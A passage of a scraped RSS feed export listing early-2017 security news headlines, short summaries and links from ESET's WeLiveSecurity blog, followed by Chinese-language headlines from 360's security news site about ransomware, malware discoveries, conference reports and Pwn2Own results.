<p>The post <a href=""http://www.welivesecurity.com/2017/03/07/wordpress-webmasters-urged-upgrade-version-4-73-patch-six-security-holes/"" rel=""nofollow"">WordPress webmasters urged to upgrade to version 4.73 to patch six security holes</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/MkxK6_DVakw"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/MkxK6_DVakw/
10 ways to ruin a cybercriminal’s day,"<p>Technology is affecting our relationships and changing our lives, but are we taking the necessary measures to protect ourselves online? Here's how to outsmart cybercriminals. </p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/06/10-ways-ruin-cybercriminals-day/"" rel=""nofollow"">10 ways to ruin a cybercriminal’s day</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/qOCluXfEGAk"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/qOCluXfEGAk/
IoT of toys stranger than fiction: Cybersecurity and data privacy update,"<p>The Internet of Stranger Things came to life in the recent case of a cuddly connected toy, raising wider and deeper questions about cybersecurity, privacy, and the future of digital technology.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/03/internet-of-things-security-privacy-iot-update/"" rel=""nofollow"">IoT of toys stranger than fiction: Cybersecurity and data privacy update</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/ldR_u9amDPg"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/ldR_u9amDPg/
"Yahoo CEO forgoes annual bonus, worth millions, over security breaches","<p>Yahoo’s Marissa Mayer has missed out on $2m from her annual bonus due to her management of security breaches affecting billions of users.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/03/yahoo-ceo-forgoes-annual-bonus-worth-millions-security-breaches/"" rel=""nofollow"">Yahoo CEO forgoes annual bonus, worth millions, over security breaches</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/NJq2ognUfUg"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/NJq2ognUfUg/
Bletchley Park: Training the next generation of cybersecurity codebreakers,"<p>Bletchley Park, considered to be the birthplace of modern computing, is to train the generation of cybersecurity codebreakers.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/03/bletchley-park-training-next-generation-cybersecurity-codebreakers/"" rel=""nofollow"">Bletchley Park: Training the next generation of cybersecurity codebreakers</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/9nDp6kQtjps"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/9nDp6kQtjps/
Major internet safety strategy to ‘bolster online safety’ for children in the UK,"<p>The UK is developing an internet safety strategy in an attempt to secure a position as “the safest place in the world for young people to go online”.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/02/major-internet-safety-strategy-bolster-online-safety-children-uk/"" rel=""nofollow"">Major internet safety strategy to ‘bolster online safety’ for children in the UK</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/4Cjm0t08DvE"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/4Cjm0t08DvE/
Talking Android ransomware extorts victims,"<p>Talking Android ransomware sounds like something out of a science fiction movie. It's not - it's very real, explains ESET's Lukas Stefanko. </p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/01/talking-android-ransomware-extorts-victims/"" rel=""nofollow"">Talking Android ransomware extorts victims</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/naS-Y5qFcuo"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/naS-Y5qFcuo/
10 reasons why cybercriminals target smartphones,"<p>There is a real feeling that smartphones are becoming a bigger target for cybercriminals. So why are they so eager to get into our devices?</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/28/10-reasons-cybercriminals-target-smartphones/"" rel=""nofollow"">10 reasons why cybercriminals target smartphones</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/9L-Q0jt1F8U"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/9L-Q0jt1F8U/
DNS attacks: How they try to direct you to fake pages,"<p>ESET's Josep Albors looks at how DNS attacks will try and direct you to fake pages.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/27/dns-attacks-try-direct-fake-pages/"" rel=""nofollow"">DNS attacks: How they try to direct you to fake pages</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/IFzhYx1RgmQ"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/IFzhYx1RgmQ/
"British man arrested after 900,000 broadband routers knocked offline in Germany","<p>A 29-year-old man has been arrested at Luton airport by the UK's National Crime Agency (NCA) in connection with a massive internet attack that disrupted telephone, television and internet services in Germany last November.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/24/german-router-attack/"" rel=""nofollow"">British man arrested after 900,000 broadband routers knocked offline in Germany</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/RNPZdpnftsc"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/RNPZdpnftsc/
Released Android malware source code used to run a banking botnet,"<p>ESET researchers have discovered a new variant of botnet-forming Android banking malware based on source code made public a couple of months ago.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/23/released-android-malware-source-code-used-run-banking-botnet/"" rel=""nofollow"">Released Android malware source code used to run a banking botnet</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/imqj00r9eys"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/imqj00r9eys/
Sunny with a chance of stolen credentials: Malicious weather app found on Google Play,"<p>ESET has spotted a new banking malware on Google Play. Disguised as a weather forecast app, it steals banking credentials and locks screens. </p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/22/sunny-chance-stolen-credentials-malicious-weather-app-found-google-play/"" rel=""nofollow"">Sunny with a chance of stolen credentials: Malicious weather app found on Google Play</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/1tJ5rHcjyr8"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/1tJ5rHcjyr8/
New crypto-ransomware hits macOS,"<p>This last month we have seen a new ransomware for Mac. Written in Swift, it is distributed on BitTorrent distribution site as “Patcher” for pirating popular software.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/22/new-crypto-ransomware-hits-macos/"" rel=""nofollow"">New crypto-ransomware hits macOS</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/pXTmob-gJq4"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/pXTmob-gJq4/
Android malware: It doesn’t hurt to know about this,"<p>Android malware is an increasing problem ... but worry not – n this infographic, we highlight some of the key things you should be aware of.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/21/doesnt-hurt-know-android-malware/"" rel=""nofollow"">Android malware: It doesn&#8217;t hurt to know about this</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/12tks2d24UI"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/12tks2d24UI/
Healthcare data breaches reach a ‘sizeable number of US consumers’,"<p>Approximately 26% of Americans have been compromised by healthcare data breaches, according to a new survey from Accenture.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/21/healthcare-data-breaches-reach-sizeable-number-us-consumers/"" rel=""nofollow"">Healthcare data breaches reach a ‘sizeable number of US consumers’</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/fooTKlpQHns"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/fooTKlpQHns/
RTM: Stealthy group targeting remote banking system,"<p>Today, ESET has released a white paper on RTM, a cybercrime group that has been relentlessly targeting businesses in Russia and neighboring countries.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/21/rtm-stealthy-group-targeting-remote-banking-system/"" rel=""nofollow"">RTM: Stealthy group targeting remote banking system</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/zrF26ZwQPV0"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/zrF26ZwQPV0/
It’s too easy to steal a second-hand connected car,"<p>Until more effort is made by vendors to integrate the internet in a safe way into the myriad of devices that surround us, we are going to hear more and more stories of security breaking down like this.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/20/easy-steal-second-hand-connected-car/"" rel=""nofollow"">It&#8217;s too easy to steal a second-hand connected car</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/1mlHn2d-4wM"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/1mlHn2d-4wM/
Support scams now reign in Spain,"<p>If you thought that the problem of tech support scams was disappearing, think again, says Josep Albors and David Harley.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/20/support-scams-now-reign-spain/"" rel=""nofollow"">Support scams now reign in Spain</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/R4-ULU_wiPk"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/R4-ULU_wiPk/
Trends in Android ransomware,"<p>2016 saw interesting developments within the Android ransomware scene. Ransomware emerged as one of the most pressing cybersecurity issues on the mobile platform.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/20/trends-android-ransomware/"" rel=""nofollow"">Trends in Android ransomware</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/rmQAiiU99BE"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/rmQAiiU99BE/
RSA – day 3: Security for those who don’t know what that means,"<p>Here at RSA, an increasing amount of security purchases are made by those who got the task dumped in their laps, but who have little or no formal or practical training.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/18/rsa-day-3-security-dont-know-means/"" rel=""nofollow"">RSA – day 3: Security for those who don’t know what that means</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/eA9AwQE1Ixk"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/eA9AwQE1Ixk/
8 things you should know about spyware,"<p>WeLiveSecurity takes a look at what you need to know about spyware – the malware secretly prying on your online activities.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/17/8-things-know-spyware/"" rel=""nofollow"">8 things you should know about spyware</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/WmcxqCZot_E"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/WmcxqCZot_E/
RSA 2017 – day 2: Attacking yourself,"<p>Want to find holes in your security perimeter? What better way than to attempt to attack yourself, and here at RSA there are plenty of tools to help.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/17/rsa-2017-day-2-attacking/"" rel=""nofollow"">RSA 2017 – day 2: Attacking yourself</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/Pt1iecqxh-I"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/Pt1iecqxh-I/
Demystifying targeted malware used against Polish banks,"<p>The purpose of this blog is to deliver technical details of an as-yet minimally documented malware that has made headlines in Poland.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/16/demystifying-targeted-malware-used-polish-banks/"" rel=""nofollow"">Demystifying targeted malware used against Polish banks</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/_MS3sm9mZd0"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/_MS3sm9mZd0/
RSA 2017: The year the little guys get swallowed up,"<p>RSA feels like a mashup of giant tech Titans steadily swallowing up the little guys to make one massive, unholy tech monster. But how does that really work for small businesses as customers, and the rest of us?</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/16/rsa-2017-year-little-guys-get-swallowed/"" rel=""nofollow"">RSA 2017: The year the little guys get swallowed up</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/94SkknXn8GI"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/94SkknXn8GI/
Gmail starts blocking JavaScript attachments: Alternative infector vectors to be expected?,"<p>Gmail rolls out a new policy to block JavaScript attachments, increasing security restrictions as ransomware attacks increase.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/16/gmail-starts-blocking-javascript-attachments-alternative-infector-vectors-expected/"" rel=""nofollow"">Gmail starts blocking JavaScript attachments: Alternative infector vectors to be expected?</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/lI33gwHObAo"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/lI33gwHObAo/
Organizations ‘concerned by cybersecurity skills gap’,"<p>The ongoing cybersecurity skills gap is dealing a significant blow to the confidence of organizations looking to defend themselves against potential attacks.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/16/organizations-concerned-cybersecurity-skills-gap/"" rel=""nofollow"">Organizations ‘concerned by cybersecurity skills gap’</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/eaKlnekkVAc"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/eaKlnekkVAc/
Proof-of-concept ransomware to poison the water supply,"<p>Researchers have described how ransomware could potentially attack industrial control systems (ICS), and demonstratied how new malware threats might target core infrastructure, holding entire cities hostage.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/15/ransomware-poison-water-supply/"" rel=""nofollow"">Proof-of-concept ransomware to poison the water supply</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/_iUtguPPJWY"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/_iUtguPPJWY/
UK government to roll out cybersecurity clubs for teens to address skills shortage,"<p>A new government scheme will be rolled out to thousands of 14-18 year olds across the UK, encouraging them to take part in extracurricular cybersecurity clubs.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/15/uk-government-roll-cybersecurity-clubs-teens-address-skills-shortage/"" rel=""nofollow"">UK government to roll out cybersecurity clubs for teens to address skills shortage</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/HZhFZTCvO9I"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/HZhFZTCvO9I/
New Android trojan mimics user clicks to download dangerous malware,"<p>Android users are exposed to a new malicious app imitating Adobe Flash Player and serving as an entrance gate for potentially any kind of dangerous malware</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/14/new-android-trojan-mimics-user-clicks-download-dangerous-malware/"" rel=""nofollow"">New Android trojan mimics user clicks to download dangerous malware</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/-PpuTOgsdIk"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/-PpuTOgsdIk/
ILOVEYOU: The wrong kind of LoveLetter,"<p>A game with love: How the LoveLetter virus corrupted our tech by playing on our emotions.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/02/14/iloveyou-wrong-kind-loveletter/"" rel=""nofollow"">ILOVEYOU: The wrong kind of LoveLetter</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/GVXg5Hk5c_s"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/GVXg5Hk5c_s/
360夺得世界黑客大赛冠军 获外媒盛赞,,http://bobao.360.cn/news/detail/4088.html
【知识】3月24日 - 每日安全知识热点,,http://bobao.360.cn/news/detail/4087.html
3月24日资讯推荐：英国海军将举行网络作战演习 网络安全保险助力风险治理体系建设,,http://bobao.360.cn/news/detail/4086.html
新型手机勒索软件危害升级，语音识别、二维码或成最大帮凶？,,http://bobao.360.cn/news/detail/4085.html
【知识】3月23日 - 每日安全知识热点,,http://bobao.360.cn/news/detail/4084.html
3月23日资讯推荐：美国国防部联合信息环境向国际开放 寄递协议服务安全管理办法4月1日施行,,http://bobao.360.cn/news/detail/4083.html
提交漏洞360SRC不仅给钱还给CVE！给CVE！给CVE！,,http://bobao.360.cn/news/detail/4080.html
黑客神技轰动全球Blackhat评审：俄罗斯人和360啥都能攻破,,http://bobao.360.cn/news/detail/4082.html
【知识】3月22日 - 每日安全知识热点,,http://bobao.360.cn/news/detail/4081.html
3月22日资讯推荐：俄罗斯阿尔法银行遭DNS攻击 我国最高院审议通过侵犯公民个人信息罪司法解释,,http://bobao.360.cn/news/detail/4079.html
【新版发布】锦行幻云2.0新版本正式面世，提供更强劲的安全防护！,,http://bobao.360.cn/news/detail/4078.html
【知识】3月21日 - 每日安全知识热点,,http://bobao.360.cn/news/detail/4077.html
【黑客犯罪】“午夜幽灵”电信诈骗团伙近日落网，头目以毒品控制年轻黑客,,http://bobao.360.cn/news/detail/4076.html
【权威报告】《2017 年 M-Trends 安全报告：前沿视角》——FireEye,,http://bobao.360.cn/news/detail/4073.html
3月21日资讯推荐：德国将网络攻击提升至“高度准备”警戒级别  2017年公安部部署网络安全大检查开始,,http://bobao.360.cn/news/detail/4071.html
世界冠军亮相CanSecWest国际峰会 360安全战队获邀演讲,,http://bobao.360.cn/news/detail/4075.html
【知识】3月20日 - 每日安全知识热点,,http://bobao.360.cn/news/detail/4069.html
3月20日资讯推荐：美国860万美元打造电网攻击预警系统 澳大利亚宣布下一代技术基金,,http://bobao.360.cn/news/detail/4068.html
世界黑客大赛中国夺冠 360荣获Pwn2Own2017总冠军,,http://bobao.360.cn/news/detail/4067.html
连环攻破VMware虚拟机 360完成史上最高难度破解,,http://bobao.360.cn/news/detail/4066.html
